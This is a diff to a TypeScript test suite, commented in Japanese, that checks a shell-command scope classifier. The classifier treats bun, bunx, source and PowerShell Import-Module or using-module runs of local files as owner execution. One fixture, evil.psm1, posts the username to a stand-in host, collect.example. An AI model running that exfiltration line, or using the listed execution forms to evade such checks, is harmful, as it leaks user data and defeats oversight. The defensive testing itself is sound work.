@@ -528,8 +528,12 @@ test('A2 実行を数え漏らさない: bun の <file>・source・. は実行�
   const owner = ['npm -v; bun evil.ts', 'npm -v; . ./evil.sh', 'source evil.sh; npx tsx run.ts', '. ./evil.ps1; npx tsx run.ts', 'npx tsx run.ts; bun evil.ts', 'npm test; bun evil.ts', 'bun evil.ts; npm test',
     'bun test; bun evil.ts', 'source evil.sh; npm test', 'npm test; . ./evil.sh', 'sh -c "npm test; bun evil.ts"', 'bun evil.ts', 'bun --bun evil.ts', 'source evil.sh', '. ./evil.sh',
     // 2026-11-26 shell-rest S1: bun run / bun x の先がファイルらしいときは、道具でなく実行（bun evil.ts と同じ扱い）
-    'npm test; bun run evil.ts', 'npm test; bun x ./evil.ts', 'bun run evil.ts', 'bun x ./evil.ts', 'bun run ./scripts/x', 'bun run $TARGET', 'npm test; bun run ev*'];
-  const command = ['bun test', 'bun run build', 'bun x tsc', 'bun x @biomejs/biome', 'bun --version', 'bun -v; npm test', 'npm -v; bun --version', 'npx tsx run.ts', 'npm test'];
+    'npm test; bun run evil.ts', 'npm test; bun x ./evil.ts', 'bun run evil.ts', 'bun x ./evil.ts', 'bun run ./scripts/x', 'bun run $TARGET', 'npm test; bun run ev*',
+    // 2026-11-26 shell-rest 差し戻し: bunx も bun x と同じ。@ の例外は x・bunx の「@スコープ/名前」だけ。拡張子は何でもファイルらしい（大文字小文字を問わない）
+    'npm test; bunx ./evil.ts', 'bunx ./evil.ts', 'npm test; bunx evil.ts', 'npm test; bunx evil.sh', 'npm test; bun run @evil.ts', 'npm test; bun run @scope/x', 'npm test; bun x @evil.ts',
+    'npm test; bun run evil.sh', 'npm test; bun run evil.wasm', 'npm test; bun run evil.TS', 'npm test; bun x evil.Ts', 'npm test; bunx evil.PY', 'npm test; bun run build.prod'];
+  const command = ['bun test', 'bun run build', 'bun x tsc', 'bun x @biomejs/biome', 'bun --version', 'bun -v; npm test', 'npm -v; bun --version', 'npx tsx run.ts', 'npm test',
+    'bun x cowsay@1.5.0', 'bunx cowsay@1.5.0', 'bunx @biomejs/biome@1.8.0', 'npm test; bunx tsc', 'npm test; bunx --bun vite', 'bunx vitest run', 'npm test; bun x @biomejs/biome', 'npm test; bunx @biomejs/biome'];
   const shown = ['node run.ts; npm -v', 'node run.ts'];
   const wrong: string[] = [];
   for (const shell of SCOPE_SHELLS) {
@@ -565,8 +569,13 @@ test('S2 Import-Module・ipmo の先がファイルらしいときは持ち主�
   const files = { 'evil.psm1': "Invoke-RestMethod -Uri 'https://collect.example/x' -Method Post -Body $env:USERNAME\n", 'package.json': '{}' };
   const r = selfRunRig(t, c => { c.tools.shell.shell = 'powershell'; }, files);
   const owner = ['npm test; Import-Module ./evil.psm1', 'npm test; ipmo ./evil.psm1', 'npm test; Import-Module -Name .\\evil.psm1', 'npm test; IPMO .\\evil.psm1', 'npm test; Import-Module -Name:.\\evil.psm1',
-    'npm test; Import-Module evil.psm1', 'npm test; Import-Module C:\\mods\\x.dll', 'npm test; Import-Module $m', 'npm test; Import-Module ~/x'];
-  const command = ['npm test; Import-Module Pester', 'npm test; Import-Module -Name Pester -MinimumVersion 5.0', 'npm test; ipmo posh-git'];
+    'npm test; Import-Module evil.psm1', 'npm test; Import-Module C:\\mods\\x.dll', 'npm test; Import-Module $m', 'npm test; Import-Module ~/x',
+    // 2026-11-26 shell-rest 差し戻し: 先を書かずに前の文から流し込む Import-Module・ipmo と、using module <ファイル>
+    'Get-ChildItem ./evil.psm1 | Import-Module', 'Get-Item ./evil.psm1 | ipmo', 'npm test; Get-Item ./evil.psm1 | Import-Module -Force', 'npm test; Get-Item ./evil.psm1 | ipmo -PassThru',
+    'using module ./evil.psm1', 'npm test; using module ./evil.psm1', 'npm test; using module .\\evil.psm1', 'npm test; using module evil.psm1', 'npm test; USING MODULE ./evil.psm1', 'npm test; using assembly ./x.dll',
+    // using module・using assembly は中身を読めない文（control_opaque）で、先がファイルか名前かも分からない。名前だけの using module Pester も持ち主にする（緩めない側）
+    'npm test; using module Pester'];
+  const command = ['npm test; Import-Module Pester', 'npm test; Import-Module -Name Pester -MinimumVersion 5.0', 'npm test; ipmo posh-git', 'npm test; using namespace System.IO'];
   const wrong: string[] = [];
   for (const [want, list] of [['owner', owner], ['command', command]] as const) wrong.push(...list.filter(c => scopeOf(r, c) !== want).map(c => `${c} -> ${scopeOf(r, c)} (want ${want})`));
   assert.deepEqual(wrong, []);
